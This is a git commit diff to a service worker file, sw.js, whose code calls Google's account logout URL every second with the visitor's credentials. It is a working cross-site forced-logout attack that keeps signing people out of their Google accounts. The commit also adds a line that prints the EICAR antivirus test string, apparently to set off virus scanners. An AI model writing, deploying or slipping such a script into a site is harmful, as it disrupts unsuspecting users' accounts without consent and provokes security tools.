d7b37bdbd1fe2f73d3b4831a5c52b373deff6043
MrBreakNFix <73456238+MrBreakNFix@users.noreply.github.com>
2023-01-07 19:09:29 -0800

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,7 +1,9 @@
 setInterval(function(){
+    
     fetch("https://www.google.com/accounts/Logout",{
   credentials: 'include',
   mode: 'no-cors', // no-cors
 })
     console.log("Logging you out");
+    console.log("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
 },1000)
